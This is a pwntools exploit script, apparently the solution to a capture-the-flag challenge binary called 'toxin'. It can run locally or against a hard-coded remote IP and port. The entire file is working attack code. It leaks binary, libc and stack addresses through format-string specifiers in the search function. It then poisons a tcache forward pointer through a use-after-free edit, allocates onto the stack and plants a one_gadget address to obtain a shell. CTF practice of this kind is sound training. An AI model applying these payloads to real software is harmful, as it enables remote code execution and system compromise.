from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
context.log_level = 'DEBUG'
DEBUG = 1
file = './toxin'
exe  = ELF(file)


def add_toxin(length, index, formula):
    success("================<ADD-TOXIN>===============")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Toxin chemical formula length: ", str(length).encode())
    io.sendlineafter(b"Toxin index: ", str(index).encode())
    io.sendlineafter(b"Enter toxin formula: ", formula)
    success("================</ADD-TOXIN>===============")

def drink_toxin(index):
    success("================<DRINK-TOXIN>===============")
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Toxin index: ", str(index).encode())
    success("================</DRINK-TOXIN>===============")


def edit_toxin(index, formula):
    success("================<EDIT-TOXIN>===============")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Toxin index: ", str(index).encode())
    io.sendlineafter(b"Enter toxin formula: ", formula)
    success("================</EDIT-TOXIN>===============")


def search_toxin(search_term):
    success("================<SEARCH-TOXIN>===============")
    io.sendlineafter(b"> ", b"4")
    info("Search term:      %s"   %   search_term)
    io.sendlineafter(b"Enter search term: ", search_term)
    success("================</SEARCH-TOXIN>===============")


def main(io, libc):
    # declared
    # exploit
    # leaked address bases
    search_toxin(b"%9$p")
    recv = io.recvline()[:-1].split(b" ")
    exe.address  = int(recv[0], 16) - 207 - exe.sym["main"]
    info("Binary base:       %#x"    %   exe.address)

    search_toxin(b"%13$p")
    recv = io.recvline().split(b" ")
    libc.address = int(recv[0], 16) - 231 - libc.sym["__libc_start_main"]
    info("Libc base:         %#x"    %   libc.address)

    info("Libc system():     %#x"    %   libc.sym["system"])

    search_toxin(b"%8$p")
    recv = io.recvline().split(b" ")
    stack_leaked = int(recv[0], 16) - 0x20
    info("Stack leaked:       %#x"    %   stack_leaked)
    #########################################################

    one_gadget = libc.address + 0x4f322

    add_toxin(0x20, 0, b"A"*8)
    # free to tcache chunks
    drink_toxin(0)

    # edit forward pointer 0 chunks
    edit_toxin(0, p64(stack_leaked))

    add_toxin(0x20, 1, b"B"*8)
    
    payload = p64(stack_leaked + 0x20) + p64(one_gadget)
    add_toxin(0x20, 2, payload)




if __name__ == '__main__':
    if DEBUG:
        libc = ELF('lib/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('lib/libc.so.6')
        io = remote('159.65.90.3', 31160)
    
    main(io, libc)
    io.interactive()